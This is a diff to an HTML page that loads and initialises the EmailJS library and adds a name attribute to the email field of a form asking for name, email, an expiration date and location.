@@ -16,6 +16,14 @@
 
             gtag('config', 'G-9MZZ65V8BT');
         </script>
+        <script type="text/javascript"
+            src="https://cdn.jsdelivr.net/npm/emailjs-com@2/dist/email.min.js">
+        </script>
+        <script type="text/javascript">
+            (function(){
+                emailjs.init("user_O7hN6watnOnJfdesnvI80");
+            })();
+        </script>
     </head>
 
     <body>
@@ -66,7 +74,7 @@
                     <div class="details__hide">
                         <form>
                             <input class="name__input" id="nn" type="text" placeholder="What's your name" autofocus/>
-                            <input class="email__input" type="email" placeholder="Your email address"/>
+                            <input class="email__input" type="email" name="yourmail" placeholder="Your email address"/>
                             <div class="second">
                                 <input class="expire" type="date" id="checkdate" onclick="date__validate()" min='1899-01-01' max='2100-13-13' placeholder="Expiration MM/YY"/>
                                 <input class="location" type="text" placeholder="Location"/>
